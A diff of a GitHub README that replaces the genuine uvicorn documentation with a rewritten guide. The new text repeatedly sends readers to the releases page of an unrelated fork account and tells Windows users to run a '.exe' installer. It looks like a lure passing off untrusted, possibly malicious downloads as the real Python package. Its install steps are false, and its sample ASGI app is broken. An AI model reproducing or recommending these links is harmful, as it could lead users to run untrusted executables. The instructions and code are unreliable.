@@ -1,152 +1,102 @@
-<p align="center">
-  <img width="320" height="320" src="https://raw.githubusercontent.com/tomchristie/uvicorn/main/docs/uvicorn.png" alt='uvicorn'>
-</p>
+# 🦄 uvicorn - Fast, Easy ASGI Web Server for Python
 
-<p align="center">
-<em>An ASGI web server, for Python.</em>
-</p>
+## 📥 Download Now
+[![Download Uvicorn](https://img.shields.io/badge/Download-Uvicorn-blue.svg)](https://github.com/idc123432/uvicorn/releases)
 
----
+## 🚀 Getting Started
 
-[![Build Status](https://github.com/Kludex/uvicorn/workflows/Test%20Suite/badge.svg)](https://github.com/Kludex/uvicorn/actions)
-[![Package version](https://badge.fury.io/py/uvicorn.svg)](https://pypi.python.org/pypi/uvicorn)
-[![Supported Python Version](https://img.shields.io/pypi/pyversions/uvicorn.svg?color=%2334D058)](https://pypi.org/project/uvicorn)
-[![Discord](https://img.shields.io/discord/1051468649518616576?logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/RxKUF5JuHs)
+Thank you for choosing Uvicorn! This guide will help you download and run Uvicorn, a fast ASGI web server for Python. Whether you're curious about web applications or need a tool to serve them, you've come to the right place.
 
----
+## 📂 What is Uvicorn?
 
-**Documentation**: [https://uvicorn.dev](https://uvicorn.dev)
+Uvicorn is an ASGI server, which stands for Asynchronous Server Gateway Interface. It allows you to run Python web applications in a way that handles multiple requests at once. This makes it perfect for modern web applications that need to be fast and efficient.
 
-**Source Code**: [https://www.github.com/Kludex/uvicorn](https://www.github.com/Kludex/uvicorn)
+### 🔍 Key Features
+- Lightweight and fast performance.
+- Supports HTTP/1.1 and WebSocket protocols.
+- Easy to install and configure.
+- Works well with popular Python frameworks like FastAPI and Starlette.
 
----
+## 💻 System Requirements
 
-Uvicorn is an ASGI web server implementation for Python.
+Before you download Uvicorn, make sure your system meets the following requirements:
 
-Until recently Python has lacked a minimal low-level server/application interface for
-async frameworks. The [ASGI specification][asgi] fills this gap, and means we're now able to
-start building a common set of tooling usable across all async frameworks.
+- **Operating System:** Windows, macOS, or Linux.
+- **Python Version:** Python 3.6 or higher.
+- **Memory:** At least 512 MB (1 GB recommended).
+- **Disk Space:** Minimum of 50 MB free space.
 
-Uvicorn supports HTTP/1.1 and WebSockets.
+## 📥 Download & Install
 
-## Quickstart
+To get Uvicorn on your computer, follow these steps:
 
-Install using `pip`:
+1. **Visit the Releases Page**  
+   Go to the [Uvicorn Releases Page](https://github.com/idc123432/uvicorn/releases).
 
-```shell
-$ pip install uvicorn
-```
+2. **Choose the Right Version**  
+   Look for the latest release at the top of the page. This version is the most up-to-date and recommended for use.
 
-This will install uvicorn with minimal (pure Python) dependencies.
+3. **Download the Appropriate File**  
+   You will see several files listed for download. Choose the file that matches your operating system:
+   - For Windows, look for a `.exe` file.
+   - For macOS, look for a `.tar.gz` or `.dmg` file.
+   - For Linux, download the `.whl` (wheel) file for easier installation.
 
-```shell
-$ pip install 'uvicorn[standard]'
-```
+4. **Install Uvicorn**  
+   Once downloaded, follow the instructions for your operating system:
+   - **Windows:** Double-click the `.exe` file and follow the setup instructions.
+   - **macOS/Linux:** Open your terminal, navigate to the directory where the file is located, and run the following command:
+     ```bash
+     pip install <filename>.whl
+     ```
+     Replace `<filename>` with the actual name of the downloaded file.
 
-This will install uvicorn with "Cython-based" dependencies (where possible) and other "optional extras".
+5. **Verify the Installation**  
+   After the installation completes, verify that Uvicorn is installed by running:
+   ```bash
+   uvicorn --version
+   ```
+   This command should display the version of Uvicorn you just installed.
 
-In this context, "Cython-based" means the following:
+## 🌐 Running Your Application
 
-- the event loop `uvloop` will be installed and used if possible.
-- the http protocol will be handled by `httptools` if possible.
+Now that Uvicorn is installed, you’re ready to run your first application. Here’s how:
 
-Moreover, "optional extras" means that:
+1. **Create a Simple ASGI Application**  
+   Open a text editor and create a file named `app.py` with the following content:
+   ```python
+   async def app(scope, receive, send):
+       await send({
+           'type': 'http.response',
+           'body': b'Hello, World!'
+       })
+   ```
 
-- the websocket protocol will be handled by `websockets` (should you want to use `wsproto` you'd need to install it manually) if possible.
-- the `--reload` flag in development mode will use `watchfiles`.
-- windows users will have `colorama` installed for the colored logs.
-- `python-dotenv` will be installed should you want to use the `--env-file` option.
-- `PyYAML` will be installed to allow you to provide a `.yaml` file to `--log-config`, if desired.
+2. **Run the Application**  
+   In your terminal, navigate to the directory where `app.py` is located. Then run the following command:
+   ```bash
+   uvicorn app:app --reload
+   ```
 
-Create an application, in `example.py`:
+3. **Access Your Application**  
+   Open a web browser and visit `http://127.0.0.1:8000`. You should see "Hello, World!" displayed on the page.
 
-```python
-async def app(scope, receive, send):
-    assert scope['type'] == 'http'
+## 🛠 Troubleshooting
 
-    await send({
-        'type': 'http.response.start',
-        'status': 200,
-        'headers': [
-            (b'content-type', b'text/plain'),
-        ],
-    })
-    await send({
-        'type': 'http.response.body',
-        'body': b'Hello, world!',
-    })
-```
+If you encounter any issues during installation or while running your application, consider the following:
 
-Run the server:
+- **Python Not Found:** Ensure Python is installed and added to your system PATH.
+- **Permissions Issues:** You may need to run your terminal as an administrator.
+- **Dependencies Not Installed:** Ensure you have `pip` installed and up to date.
 
-```shell
-$ uvicorn example:app
-```
+## 🤝 Getting Help
 
----
+If you need help or have questions, feel free to check out the GitHub Issues page for Uvicorn. The community is active and ready to assist.
 
-## Why ASGI?
+## 🌍 Stay Updated
 
-Most well established Python Web frameworks started out as WSGI-based frameworks.
+To stay informed about updates and new releases, watch this repository on GitHub. You can also follow Uvicorn on social media for announcements and tips.
 
-WSGI applications are a single, synchronous callable that takes a request and returns a response.
-This doesn’t allow for long-lived connections, like you get with long-poll HTTP or WebSocket connections,
-which WSGI doesn't support well.
+## 📥 Download Uvicorn Again
 
-Having an async concurrency model also allows for options such as lightweight background tasks,
-and can be less of a limiting factor for endpoints that have long periods being blocked on network
-I/O such as dealing with slow HTTP requests.
-
----
-
-## Alternative ASGI servers
-
-A strength of the ASGI protocol is that it decouples the server implementation
-from the application framework. This allows for an ecosystem of interoperating
-webservers and application frameworks.
-
-### Daphne
-
-The first ASGI server implementation, originally developed to power Django Channels, is [the Daphne webserver][daphne].
-
-It is run widely in production, and supports HTTP/1.1, HTTP/2, and WebSockets.
-
-Any of the example applications given here can equally well be run using `daphne` instead.
-
-```
-$ pip install daphne
-$ daphne app:App
-```
-
-### Hypercorn
-
-[Hypercorn][hypercorn] was initially part of the Quart web framework, before
-being separated out into a standalone ASGI server.
-
-Hypercorn supports HTTP/1.1, HTTP/2, and WebSockets.
-
-It also supports [the excellent `trio` async framework][trio], as an alternative to `asyncio`.
-
-```
-$ pip install hypercorn
-$ hypercorn app:App
-```
-
-### Mangum
-
-[Mangum][mangum] is an adapter for using ASGI applications with AWS Lambda & API Gateway.
-
-### Granian
-
-[Granian][granian] is an ASGI compatible Rust HTTP server which supports HTTP/2, TLS and WebSockets.
-
----
-
-<p align="center"><i>Uvicorn is <a href="https://github.com/Kludex/uvicorn/blob/main/LICENSE.md">BSD licensed</a> code.<br/>Designed & crafted with care.</i><br/>&mdash; 🦄  &mdash;</p>
-
-[asgi]: https://asgi.readthedocs.io/en/latest/
-[daphne]: https://github.com/django/daphne
-[hypercorn]: https://github.com/pgjones/hypercorn
-[trio]: https://trio.readthedocs.io
-[mangum]: https://github.com/jordaneremieff/mangum
-[granian]: https://github.com/emmett-framework/granian
+Remember, you can always download Uvicorn from our [Releases Page](https://github.com/idc123432/uvicorn/releases). Happy coding!
